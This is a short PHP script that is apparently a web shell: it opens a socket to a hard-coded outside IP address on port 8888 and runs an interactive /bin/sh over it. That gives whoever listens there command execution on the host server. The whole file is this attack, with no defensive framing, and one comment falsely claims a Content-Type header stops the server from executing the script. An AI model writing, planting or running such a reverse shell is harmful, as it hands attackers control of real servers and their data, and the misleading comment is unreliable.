<?php

// Set the HTTP header to "text/html" to prevent the server from executing the script
header("Content-Type: text/html");

// Extract the listener's IP address and port number from the webpage
$listener_ip = '62.171.160.234'; // Replace with the extracted IP address
$listener_port = '8888'; // Replace with the extracted port number

// Create a reverse shell connection to the listener
$sock = fsockopen($listener_ip, $listener_port);

// Execute the command
exec("/bin/sh -i <&3 >&3 2>&3");

?>